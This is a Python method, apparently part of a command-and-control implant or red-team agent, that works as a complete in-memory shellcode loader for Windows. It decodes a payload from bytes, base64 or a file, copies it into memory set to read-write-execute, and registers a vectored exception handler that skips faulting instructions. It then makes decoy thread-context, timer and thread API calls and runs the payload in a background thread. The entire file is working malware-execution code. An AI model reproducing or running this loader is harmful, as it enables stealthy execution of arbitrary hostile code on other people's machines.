    def veh_exec(self, sc, debug=False, task_id=None, **kwargs):
        import base64
        import ctypes
        import os
        import threading
        from ctypes import wintypes

        output = []

        def info(msg):
            if not debug:
                output.append(f"[*] {msg}")

        def dbg(msg):
            if debug:
                output.append(f"[DEBUG] {msg}")

        kernel32 = ctypes.windll.kernel32
        ntdll = ctypes.windll.ntdll

        CONTEXT_AMD64 = 0x00100000
        CONTEXT_DEBUG_REGISTERS = CONTEXT_AMD64 | 0x00000010
        CONTEXT_INTEGER = CONTEXT_AMD64 | 0x00000002
        CONTEXT_CONTROL = CONTEXT_AMD64 | 0x00000001
        CURRENT_THREAD_PSEUDO_HANDLE = ctypes.c_void_p(-2)

        EXCEPTION_CONTINUE_EXECUTION = -1
        EXCEPTION_CONTINUE_SEARCH = 0
        EXCEPTION_ACCESS_VIOLATION = 0xC0000005

        class M128A(ctypes.Structure):
            _fields_ = [("Low", ctypes.c_ulonglong), ("High", ctypes.c_longlong)]

        class XSAVE_FORMAT(ctypes.Structure):
            _fields_ = [
                ("ControlWord", wintypes.WORD),
                ("StatusWord", wintypes.WORD),
                ("TagWord", ctypes.c_byte),
                ("Reserved1", ctypes.c_byte),
                ("ErrorOpcode", wintypes.WORD),
                ("ErrorOffset", wintypes.DWORD),
                ("ErrorSelector", wintypes.WORD),
                ("Reserved2", wintypes.WORD),
                ("DataOffset", wintypes.DWORD),
                ("DataSelector", wintypes.WORD),
                ("Reserved3", wintypes.WORD),
                ("MxCsr", wintypes.DWORD),
                ("MxCsrMask", wintypes.DWORD),
                ("FloatRegisters", M128A * 8),
                ("XmmRegisters", M128A * 16),
                ("Reserved4", ctypes.c_byte * 96),
            ]

        class CONTEXT(ctypes.Structure):
            _align_ = 16
            _fields_ = [
                ("P1Home", ctypes.c_ulonglong),
                ("P2Home", ctypes.c_ulonglong),
                ("P3Home", ctypes.c_ulonglong),
                ("P4Home", ctypes.c_ulonglong),
                ("P5Home", ctypes.c_ulonglong),
                ("P6Home", ctypes.c_ulonglong),
                ("ContextFlags", wintypes.DWORD),
                ("MxCsr", wintypes.DWORD),
                ("SegCs", wintypes.WORD),
                ("SegDs", wintypes.WORD),
                ("SegEs", wintypes.WORD),
                ("SegFs", wintypes.WORD),
                ("SegGs", wintypes.WORD),
                ("SegSs", wintypes.WORD),
                ("EFlags", wintypes.DWORD),
                ("Dr0", ctypes.c_ulonglong),
                ("Dr1", ctypes.c_ulonglong),
                ("Dr2", ctypes.c_ulonglong),
                ("Dr3", ctypes.c_ulonglong),
                ("Dr6", ctypes.c_ulonglong),
                ("Dr7", ctypes.c_ulonglong),
                ("Rax", ctypes.c_ulonglong),
                ("Rcx", ctypes.c_ulonglong),
                ("Rdx", ctypes.c_ulonglong),
                ("Rbx", ctypes.c_ulonglong),
                ("Rsp", ctypes.c_ulonglong),
                ("Rbp", ctypes.c_ulonglong),
                ("Rsi", ctypes.c_ulonglong),
                ("Rdi", ctypes.c_ulonglong),
                ("R8", ctypes.c_ulonglong),
                ("R9", ctypes.c_ulonglong),
                ("R10", ctypes.c_ulonglong),
                ("R11", ctypes.c_ulonglong),
                ("R12", ctypes.c_ulonglong),
                ("R13", ctypes.c_ulonglong),
                ("R14", ctypes.c_ulonglong),
                ("R15", ctypes.c_ulonglong),
                ("Rip", ctypes.c_ulonglong),
                ("FltSave", XSAVE_FORMAT),
                ("VectorRegister", M128A * 26),
                ("VectorControl", ctypes.c_ulonglong),
                ("DebugControl", ctypes.c_ulonglong),
                ("LastBranchToRip", ctypes.c_ulonglong),
                ("LastBranchFromRip", ctypes.c_ulonglong),
                ("LastExceptionToRip", ctypes.c_ulonglong),
                ("LastExceptionFromRip", ctypes.c_ulonglong),
            ]

        class EXCEPTION_RECORD(ctypes.Structure):
            pass

        EXCEPTION_RECORD._fields_ = [
            ("ExceptionCode", wintypes.DWORD),
            ("ExceptionFlags", wintypes.DWORD),
            ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
            ("ExceptionAddress", ctypes.c_void_p),
            ("NumberParameters", wintypes.DWORD),
            ("ExceptionInformation", ctypes.c_ulonglong * 15),
        ]

        class EXCEPTION_POINTERS(ctypes.Structure):
            _fields_ = [
                ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
                ("ContextRecord", ctypes.POINTER(CONTEXT)),
            ]

        dbg(f"CONTEXT sizeof={ctypes.sizeof(CONTEXT):#x}, align={ctypes.alignment(CONTEXT)}")

        ctx = CONTEXT()
        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS
        dbg(f"Initialized CONTEXT @ {ctypes.addressof(ctx):#x} with ContextFlags={ctx.ContextFlags:#x}")

        def _decode_x64_len_little(raw: bytes) -> int:
            if len(raw) < 2:
                return 0

            idx = 0
            if 0x40 <= raw[idx] <= 0x4F:
                idx += 1
                if idx >= len(raw):
                    return 0

            opcode = raw[idx]
            idx += 1

            if opcode in (0x00, 0x01, 0x84, 0x85, 0x86, 0x87, 0x88, 0x89, 0x8A, 0x8B):
                if idx >= len(raw):
                    return 0
                modrm = raw[idx]
                idx += 1
                mod = (modrm >> 6) & 0x3
                rm = modrm & 0x7

                sib = None
                if mod != 3 and rm == 4:
                    if idx >= len(raw):
                        return 0
                    sib = raw[idx]
                    idx += 1

                if mod == 0 and rm == 5:
                    if idx + 4 > len(raw):
                        return 0
                    idx += 4
                elif mod == 0 and sib is not None and (sib & 0x7) == 5:
                    if idx + 4 > len(raw):
                        return 0
                    idx += 4
                elif mod == 1:
                    if idx + 1 > len(raw):
                        return 0
                    idx += 1
                elif mod == 2:
                    if idx + 4 > len(raw):
                        return 0
                    idx += 4

                return idx

            return 0

        def _adv_rip_and_continue(ctx_ptr, insn_len):
            ctx_ptr.Rip += insn_len
            return EXCEPTION_CONTINUE_EXECUTION

        PVECTORED_EXCEPTION_HANDLER = ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p)
        WAITORTIMERCALLBACK = ctypes.WINFUNCTYPE(None, wintypes.LPVOID, wintypes.BOOLEAN)
        LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)

        def _veh_fn(pexp):
            if not pexp:
                return EXCEPTION_CONTINUE_SEARCH

            ptrs = ctypes.cast(pexp, ctypes.POINTER(EXCEPTION_POINTERS)).contents
            rec = ptrs.ExceptionRecord.contents
            ctx_ptr = ptrs.ContextRecord.contents
            fault_addr = rec.ExceptionInformation[1] if rec.NumberParameters >= 2 else 0

            raw = bytes((ctypes.c_ubyte * 16).from_address(rec.ExceptionAddress)) if rec.ExceptionAddress else b""
            dbg(
                f"VEH code={rec.ExceptionCode:#x} addr={rec.ExceptionAddress or 0:#x} "
                f"fault_va={fault_addr:#x} Rip={ctx_ptr.Rip:#x} Rsp={ctx_ptr.Rsp:#x} "
                f"Rax={ctx_ptr.Rax:#x} Rcx={ctx_ptr.Rcx:#x} bytes={raw[:8].hex()}"
            )

            if rec.ExceptionCode == EXCEPTION_ACCESS_VIOLATION and raw:
                insn_len = _decode_x64_len_little(raw)
                if insn_len > 0:
                    info(f"Handled access violation at {ctx_ptr.Rip:#x}; skipping {insn_len} bytes")
                    dbg(f"Decoded little-endian instruction length={insn_len}; advancing Rip from {ctx_ptr.Rip:#x}")
                    return _adv_rip_and_continue(ctx_ptr, insn_len)

                if fault_addr < 0x10000:
                    info(f"Handled low-address fault at {ctx_ptr.Rip:#x}; skipping 2 bytes")
                    dbg(f"Low-address fault ({fault_addr:#x}) with unrecognized opcode; skipping 2 bytes")
                    return _adv_rip_and_continue(ctx_ptr, 2)

            return EXCEPTION_CONTINUE_SEARCH

        def _timer_fn(param, fired):
            dbg(f"Timer callback invoked: param={param or 0:#x}, fired={fired}")
            return None

        def _thread_fn(param):
            dbg(f"Thread start routine invoked: param={param or 0:#x}")
            return 0

        veh_callback = PVECTORED_EXCEPTION_HANDLER(_veh_fn)
        timer_cb = WAITORTIMERCALLBACK(_timer_fn)
        start_routine = LPTHREAD_START_ROUTINE(_thread_fn)

        if isinstance(sc, (bytes, bytearray)):
            sc_bytes = bytes(sc)
        elif hasattr(sc, "read"):
            sc_bytes = sc.read()
        elif isinstance(sc, str):
            try:
                sc_bytes = base64.b64decode(sc, validate=True)
            except Exception:
                info(f"Loading binary from {sc}")
                with open(sc, "rb") as f:
                    sc_bytes = f.read()
        else:
            sc_bytes = bytes(sc)

        if not sc_bytes:
            raise ValueError("Empty binary payload")

        alloc_size = max(4096, len(sc_bytes))

        kernel32.VirtualAlloc.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
        kernel32.VirtualAlloc.restype = wintypes.LPVOID
        alloc_ptr = kernel32.VirtualAlloc(None, alloc_size, 0x3000, 0x04)
        if not alloc_ptr:
            raise ctypes.WinError(ctypes.get_last_error())
        dbg(f"VirtualAlloc(size={alloc_size}) -> {alloc_ptr:#x}")

        src_buf = ctypes.create_string_buffer(sc_bytes)
        ctypes.memmove(alloc_ptr, ctypes.addressof(src_buf), len(sc_bytes))
        dbg(f"memmove {len(sc_bytes)} bytes from buffer ({ctypes.addressof(src_buf):#x}) to {alloc_ptr:#x}")

        kernel32.VirtualProtect.argtypes = [wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.PDWORD]
        kernel32.VirtualProtect.restype = wintypes.BOOL
        old_protect = wintypes.DWORD(0)
        vp_ok = kernel32.VirtualProtect(alloc_ptr, alloc_size, 0x40, ctypes.byref(old_protect))
        dbg(f"VirtualProtect -> ok={vp_ok}, old_protect={old_protect.value:#x}")
        info(f"Allocated {alloc_size} bytes and set memory protection to RWX")

        kernel32.GetModuleHandleA.argtypes = [wintypes.LPCSTR]
        kernel32.GetModuleHandleA.restype = wintypes.HMODULE
        h_mod = kernel32.GetModuleHandleA(b"ntdll.dll")
        dbg(f"GetModuleHandleA('ntdll.dll') -> {h_mod or 0:#x}")

        kernel32.GetProcAddress.argtypes = [wintypes.HMODULE, wintypes.LPCSTR]
        kernel32.GetProcAddress.restype = ctypes.c_void_p
        proc_addr = kernel32.GetProcAddress(h_mod, b"NtCreateThreadEx")
        dbg(f"GetProcAddress('NtCreateThreadEx') -> {proc_addr or 0:#x}")

        kernel32.GetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT)]
        kernel32.GetThreadContext.restype = wintypes.BOOL
        gtc_ok = kernel32.GetThreadContext(CURRENT_THREAD_PSEUDO_HANDLE, ctypes.byref(ctx))
        dbg(f"GetThreadContext -> ok={gtc_ok}, Dr0={ctx.Dr0:#x}, Dr7={ctx.Dr7:#x}, Rip={ctx.Rip:#x}, Rsp={ctx.Rsp:#x}")

        kernel32.SetThreadContext.argtypes = [wintypes.HANDLE, ctypes.POINTER(CONTEXT)]
        kernel32.SetThreadContext.restype = wintypes.BOOL
        stc_ok = kernel32.SetThreadContext(CURRENT_THREAD_PSEUDO_HANDLE, ctypes.byref(ctx))
        dbg(f"SetThreadContext -> ok={stc_ok}")

        kernel32.AddVectoredExceptionHandler.argtypes = [wintypes.ULONG, PVECTORED_EXCEPTION_HANDLER]
        kernel32.AddVectoredExceptionHandler.restype = ctypes.c_void_p
        veh_handle = kernel32.AddVectoredExceptionHandler(1, veh_callback)
        dbg(f"AddVectoredExceptionHandler -> {veh_handle or 0:#x}")
        info("Registered vectored exception handler")

        h_timer = wintypes.HANDLE(0)
        kernel32.CreateTimerQueueTimer.argtypes = [
            ctypes.POINTER(wintypes.HANDLE),
            wintypes.HANDLE,
            WAITORTIMERCALLBACK,
            wintypes.LPVOID,
            wintypes.DWORD,
            wintypes.DWORD,
            wintypes.ULONG,
        ]
        kernel32.CreateTimerQueueTimer.restype = wintypes.BOOL
        ctq_ok = kernel32.CreateTimerQueueTimer(ctypes.byref(h_timer), None, timer_cb, None, 0, 0, 0)
        dbg(f"CreateTimerQueueTimer -> ok={ctq_ok}, h_timer={h_timer.value or 0:#x}")

        kernel32.Sleep.argtypes = [wintypes.DWORD]
        kernel32.Sleep.restype = None
        dbg("Sleeping 100ms")
        kernel32.Sleep(100)

        kernel32.ResumeThread.argtypes = [wintypes.HANDLE]
        kernel32.ResumeThread.restype = wintypes.DWORD
        prev_suspend = kernel32.ResumeThread(CURRENT_THREAD_PSEUDO_HANDLE)
        dbg(f"ResumeThread -> prev_count={prev_suspend:#x}")

        kernel32.CreateThread.argtypes = [
            wintypes.LPVOID,
            ctypes.c_size_t,
            LPTHREAD_START_ROUTINE,
            wintypes.LPVOID,
            wintypes.DWORD,
            wintypes.LPDWORD,
        ]
        kernel32.CreateThread.restype = wintypes.HANDLE
        h_thread = kernel32.CreateThread(None, 0, start_routine, None, 0, None)
        dbg(f"CreateThread -> handle={h_thread or 0:#x}")

        kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
        kernel32.WaitForSingleObject.restype = wintypes.DWORD
        wait_res = kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)
        dbg(f"WaitForSingleObject -> {wait_res:#x}")

        kernel32.Beep.argtypes = [wintypes.DWORD, wintypes.DWORD]
        kernel32.Beep.restype = wintypes.BOOL
        beep_ok = kernel32.Beep(666, 666)
        dbg(f"Beep(666, 666) -> ok={beep_ok}")

        # Anchor references so GC does not free the buffer, VEH callback, or thread during async execution.
        keepalive = (src_buf, veh_callback, timer_cb, start_routine)
        fn_sc = ctypes.WINFUNCTYPE(None)(alloc_ptr)
        started = threading.Event()

        def _run_payload():
            started.set()
            try:
                fn_sc()
            except Exception as exc:
                dbg(f"Payload thread exception: {exc}")
            finally:
                _ = keepalive

        runner = threading.Thread(target=_run_payload, daemon=True)
        runner.start()
        started.wait(timeout=1.0)

        info(f"Started binary ({len(sc_bytes)} bytes) asynchronously at {alloc_ptr:#x} (tid={runner.ident})")
        dbg(f"Dispatched thread tid={runner.ident} for {alloc_ptr:#x}; returning immediately")
        return "\n".join(output)